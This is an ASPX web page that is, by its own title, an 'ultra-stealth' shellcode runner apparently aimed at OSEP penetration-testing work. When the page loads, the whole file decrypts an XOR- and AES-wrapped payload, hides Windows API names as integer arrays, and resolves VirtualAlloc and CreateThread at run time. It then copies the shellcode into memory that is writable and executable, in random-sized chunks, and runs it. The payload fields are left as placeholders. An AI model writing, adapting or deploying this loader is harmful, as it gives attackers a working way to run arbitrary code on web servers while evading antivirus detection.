<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Reflection" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>

<h1> ASPX Ultra-Stealth Shellcode Runner (OSEP Ready) </h1>

<script runat="server">

    // Define correct delegates
    private delegate IntPtr D_VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    private delegate IntPtr D_CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    private delegate IntPtr D_LoadLibraryA(string lpLibFileName);
    private delegate IntPtr D_GetProcAddress(IntPtr hModule, string lpProcName);

    protected void Page_Load(object sender, EventArgs e)
    {
        try
        {
            // ====== PASTE HERE the generated fragment from AES_XOR_Encryptor.py ======
            string[] x1 = { "..." };
            string[] x2 = { "..." };
            string[] x3 = { "..." };
            byte xorKey = 0x5A;
            // ==========================================================================

            // Reconstruct Base64 strings
            string KEY_B64 = string.Concat(x1);
            string IV_B64 = string.Concat(x2);
            string ENC_B64 = string.Concat(x3);

            // Decode Base64
            byte[] aesKey = Convert.FromBase64String(KEY_B64);
            byte[] aesIV = Convert.FromBase64String(IV_B64);
            byte[] encryptedShellcodeXor = Convert.FromBase64String(ENC_B64);

            // First remove XOR
            for (int i = 0; i < encryptedShellcodeXor.Length; i++)
            {
                encryptedShellcodeXor[i] ^= xorKey;
            }

            // Then decrypt AES
            byte[] shellcode = AESDecrypt(encryptedShellcodeXor, aesKey, aesIV);

            // Build API names dynamically
            string dll = BuildString(new int[] { 107, 101, 114, 110, 101, 108, 51, 50, 46, 100, 108, 108 }); // "kernel32.dll"
            string api_LoadLibrary = BuildString(new int[] { 76, 111, 97, 100, 76, 105, 98, 114, 97, 114, 121, 65 }); // "LoadLibraryA"
            string api_GetProcAddress = BuildString(new int[] { 71, 101, 116, 80, 114, 111, 99, 65, 100, 100, 114, 101, 115, 115 }); // "GetProcAddress"
            string api_VirtualAlloc = BuildString(new int[] { 86, 105, 114, 116, 117, 97, 108, 65, 108, 108, 111, 99 }); // "VirtualAlloc"
            string api_CreateThread = BuildString(new int[] { 67, 114, 101, 97, 116, 101, 84, 104, 114, 101, 97, 100 }); // "CreateThread"

            // Dynamically resolve LoadLibraryA
            IntPtr hKernel32 = LoadLibrary(dll);
            IntPtr loadLibraryPtr = GetProcAddress(hKernel32, api_LoadLibrary);
            D_LoadLibraryA loadLibraryA = (D_LoadLibraryA)Marshal.GetDelegateForFunctionPointer(loadLibraryPtr, typeof(D_LoadLibraryA));
            IntPtr kernel32 = loadLibraryA(dll);

            // Dynamically resolve GetProcAddress
            IntPtr getProcAddressPtr = GetProcAddress(kernel32, api_GetProcAddress);
            D_GetProcAddress getProcAddress = (D_GetProcAddress)Marshal.GetDelegateForFunctionPointer(getProcAddressPtr, typeof(D_GetProcAddress));
            IntPtr addrVirtualAlloc = getProcAddress(kernel32, api_VirtualAlloc);
            IntPtr addrCreateThread = getProcAddress(kernel32, api_CreateThread);

            // Prepare shellcode execution
            D_VirtualAlloc VirtualAlloc = (D_VirtualAlloc)Marshal.GetDelegateForFunctionPointer(addrVirtualAlloc, typeof(D_VirtualAlloc));
            D_CreateThread CreateThread = (D_CreateThread)Marshal.GetDelegateForFunctionPointer(addrCreateThread, typeof(D_CreateThread));

            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);

            // Write shellcode in random chunks
            Random rnd = new Random();
            int offset = 0;
            while (offset < shellcode.Length)
            {
                int chunkSize = rnd.Next(40, 120);
                if (offset + chunkSize > shellcode.Length)
                    chunkSize = shellcode.Length - offset;

                Marshal.Copy(shellcode, offset, addr + offset, chunkSize);
                offset += chunkSize;
            }

            // Execute shellcode
            CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        }
        catch (Exception ex)
        {
            Response.Write("<pre> Error: " + Server.HtmlEncode(ex.ToString()) + "</pre>");
        }
    }

    private byte[] AESDecrypt(byte[] data, byte[] key, byte[] iv)
    {
        using (Aes aes = Aes.Create())
        {
            aes.Key = key;
            aes.IV = iv;
            using (var decryptor = aes.CreateDecryptor())
            using (var ms = new MemoryStream(data))
            using (var cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
            using (var br = new BinaryReader(cs))
            {
                return br.ReadBytes(data.Length);
            }
        }
    }

    private string BuildString(int[] codes)
    {
        StringBuilder sb = new StringBuilder();
        foreach (int c in codes) { sb.Append((char)c); }
        return sb.ToString();
    }

    [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr LoadLibrary(string lpFileName);
    [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
</script>
